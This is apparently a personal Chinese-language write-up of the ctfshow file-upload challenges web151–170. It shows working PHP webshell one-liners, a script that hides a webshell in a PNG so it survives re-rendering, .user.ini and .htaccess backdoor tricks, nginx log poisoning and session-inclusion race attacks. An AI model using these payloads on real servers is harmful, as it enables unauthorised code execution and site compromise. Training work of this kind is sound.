---
title: "ctfshow Web入门[文件上传] Writeup"
date: 2022-08-03T14:29:48+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

常见的上传漏洞

<!--more-->

## web151

"前台校验不可靠"

前端 js 验证, 同时对图片内容进行了验证

![20220729144234](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729144234.png)

上传抓包改后缀

![20220729144318](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729144318.png)

## web152

之前的图片马抓包改后缀上传直接就成功了

看了 wp 才发现是在验证 MIME Type (Content-Type)

## web153

一开始试了好几个后缀都不成功 (应该是黑名单验证)

网上查了一下考察的是 `.user.ini`

[https://www.cnblogs.com/NineOne/p/14033391.html](https://www.cnblogs.com/NineOne/p/14033391.html)

我的理解是用户层面的 `php.ini` (类似于 dll 查找优先级), 一部分配置 (除了 PHP_INI_SYSTEM 以外) 可以优先于 `php.ini` 生效

其中的两个配置 `auto_append_file` `auto_prepend_file` 能用来制造后门

`auto_append_file` 在该目录下的所有文件尾部包含某个文件的内容, `auto_prepend_file` 则是在文件头部包含某个文件的内容

注意这个是不能跨目录的, `.user.ini` 的作用范围被限制在了上传后所在的文件夹, 但这里**碰巧**的是 /upload/ 目录下存在一个 index.php

![20220729151238](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729151238.png)

根据黑名单机制, 我们先上传图片马, 然后上传 `.user.ini`, 内容如下

```ini
auto_append_file = "2.png"
```

注意修改 Content-Type, 而且文件名要加引号

访问 index.php

![20220729151810](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729151810.png)

## web154

图片不能正常上传

测试了一下发现是检测了文件内容中的 `php` 字符串

将 php 改成 `=` 即可绕过 (或者 `php` 修改为大写)

```php
<?= eval($_REQUEST['a']); ?>

<?phP eval($_REQUEST['a']); ?>
```

加 `=` 的效果类似 `echo`

之后配合 `.user.ini`

或者是利用 PHP 短标签, 将一句话改为 `<? eval($_REQUEST['a']);?>`

`.user.ini` 改为如下内容

```ini
auto_append_file = "2.png"
short_open_tag = On
```

上传即可

使用 `<script>` 标签也可以, 未测试

## web155

过滤了 `PHP`, 忽略大小写

利用 `<?=` `<?` 短标签依然可以绕过

## web156

自己的图片马有点问题, 把代码删掉还是传不了

看了师傅的 wp 发现是过滤了 `[]`

用 `{}` 绕过

```php
<?= eval($_REQUEST{'a'}); ?>

<?= eval($_REQUEST{1}); ?>
```

## web157

`[]` `{}`, `;` 都被过滤了

考虑到机器是 Linux, 使用 `system()` 执行文件查看 flag.php

`php` 被过滤了, 但是可以用通配符 `*`

```php
Gif89a
<?= system('cat ../flag.*')?>
```

最后一个分号可以省略 (一句话的情况下)

之后访问 /upload/index.php 右键查看 flag

## web158

同上

## web159

又过滤了 `()`

用反引号绕过

```php
<?= `cat ../flag.*`?>
```

## web160

反引号和空格也被过滤了, 没想出来

网上 wp 的思路是通过文件包含

nginx 默认日志地址为 `/var/log/nginx/access.log`

默认格式

```log
log_format access '$remote_addr – $remote_user [$time_local] "$request"' '$status $body_bytes_sent "$http_referer"' '"$http_user_agent" $http_x_forwarded_for';
```

include

注意 log 被过滤了, 需要拼接字符串
```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

更改 User-Agent 为 PHP 一句话, 再访问一次网站即可

也可以用伪协议, 字符串拼接绕过过滤

```php
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.ph"."p"?>
```

## web161

增加了对文件头的验证

![20220729191141](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729191141.png)

![20220729191507](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729191507.png)

Content-Type, filename 文件头都是 gif 格式的竟然上传不了

把前两个改成 png 就能上传了

使用 GIF89a 的原因是他是 jpg png gif bmp 中唯一一个可以以字符串表示的文件头

获取 flag 方法同上

后来查了一下发现是利用 `getimagesize()` 验证文件头的

## web162

`.` `flag` 被过滤了

看了 wp 才知道考察的是 session 文件包含 + 条件竞争

[https://www.php.net/manual/zh/session.upload-progress.php](https://www.php.net/manual/zh/session.upload-progress.php)

php.ini 相关配置

```ini
session.upload_progress.enabled = On
 
session.upload_progress.prefix = "upload_progress_"
 
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
 
session.use_strict_mode = Off 
 
session.save_path = /tmp

session.upload_progress.cleanup = On
```

在相关选项开启的情况下, 我们如果在上传文件的过程中 POST 一个变量 `PHP_SESSION_UPLOAD_PROGRESS`, PHP 就会创建一个对应的 session 文件, 文件内包含 `PHP_SESSION_UPLOAD_PROGRESS` 的值

如果 `session.use_strict_mode = Off` 时, 我们可以通过在 Cookie 中设置 `PHPSESSID=123` (默认 prefix 为 PHPSESSID) 来指定 session 文件名为 `sess_123` (否则就是 `sess_[32位随机字符串]`)

当 `session.upload_progress.cleanup = On` 的话比较麻烦, 因为要条件竞争

upload.html

```html
<form action="http://9db88424-f6af-4562-8975-4d99539c2149.challenge.ctf.show/upload.php" method="POST" enctype="multipart/form-data">
<input type="text" name="PHP_SESSION_UPLOAD_PROGRESS" value="xxx" />
<input type="file" name="file" id="file" />
<input type="submit" name="submit" value="submit" />
</form>
```

.user.ini

```ini
GIF89a
auto_prepend_file=/tmp/sess_123
```

header 改 `Cookie: PHPSESSID=123` 上传即可

测试了好几次都不行, intruder 线程多一点就503, 少一点就竞争不了

b站的视频是非预期解 [https://www.bilibili.com/video/BV1Qf4y1u7cU](https://www.bilibili.com/video/BV1Qf4y1u7cU)

利用 IP 长地址, 不过访问了一下发现 index 文件已经被改回去了

IP 长地址转换 [https://www.bejson.com/convert/ip2int/](https://www.bejson.com/convert/ip2int/)

手头上没有 vps, 这题先放着...

## web163

同上

## web164

图片上传后被重命名, 必须上传真实的图片文件, 而且只允许上传 png

![20220803194700](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803194700.png)

`http://b16c225d-f117-436b-9f62-11758ba84604.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png`

上传成功后右键查看 PHP 一句话消失了, 估计是二次渲染

download.php 猜测是文件包含

PHP 通过 gd 库实现二次渲染

```
imagecreatefromgif()
imagecreatefromjpeg()
imagecreatefrompng()
...
```

[https://www.php.net/manual/zh/ref.image.php](https://www.php.net/manual/zh/ref.image.php)

注意 gif png jpeg 绕过二次渲染的方法并不相同

参考这篇文章 [https://xz.aliyun.com/t/2657](https://xz.aliyun.com/t/2657)

这里直接贴 png payload 的代码

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

生成的一句话是 `<?=$_GET[0]($_POST[1]);?>`

上传后传参

![20220803200210](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803200210.png)

## web165

上传 png

![20220803200651](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803200651.png)

burp 抓包无数据, 应该是前端验证

![20220803200733](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803200733.png)

上传后发现文件也被重命名了, 估计跟上题一样是二次渲染

jpg payload 用上面文章给出的 payload 生成

jpg 要多试几个, 因为有的文件可能会有特殊字符导致解析失败

或者直接用我这个也行

[2049745.jpg](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/2049745.jpg)

![20220803203036](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803203036.png)

## web166

ext 改成了 zip

`http://2cba3dcb-0c03-48ad-9ebf-f13b51325b9c.challenge.ctf.show/upload/download.php?file=f30ecfc1838f32aacb20a1d0d258d4a1.zip`

![20220803203727](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803203727.png)

文件类型不合规, 限制了是 zip 后缀

![20220803203753](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803203753.png)

发现直接改一句话上传就行

![20220803210419](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803210419.png)

download.php 读取 zip

![20220803210427](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803210427.png)

## web167

hint 是 httpd

404 界面显示 Apache/2.4.25 (Debian) Server

![20220803211014](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803211014.png)

文件名没有改变

明显是考察 .htaccess

[https://www.cnblogs.com/ggc-gyx/p/16412236.html](https://www.cnblogs.com/ggc-gyx/p/16412236.html)

.htaccess

```htaccess
<IfModule mime_module>
AddType application/x-httpd-php .jpg
</IfModule>
```

![20220803211657](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803211657.png)

查看 flag

![20220803211732](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803211732.png)

## web168

基础免杀

过滤了 eval assert get post cookie 关键词

用 `$_REQUEST` 绕过

```php
<?php $_REQUEST[1]($_REQUEST[2]);?>
```

这次是 nginx, php 后缀直接就能上传...

![20220803213019](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803213019.png)

eval assert 都不太好使, 用 system 执行命令

![20220803213303](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803213303.png)

## web169

高级免杀

nginx 服务器, `<` `>` 都被过滤了, 但是 php 后缀能上传

![20220803214139](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803214139.png)

Content-Type 好像必须是 image/png 才行

upload 目录下没有 index.php, 但因为我们可以自行上传 php

所以配合 .user.ini 包含 nginx 日志

![20220803214447](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220803214447.png)

连接 `http://1b28bec0-f7f1-48c0-a4a7-1359931ee9ba.challenge.ctf.show/upload/2.php` 得到 flag

## web170

终极免杀

同上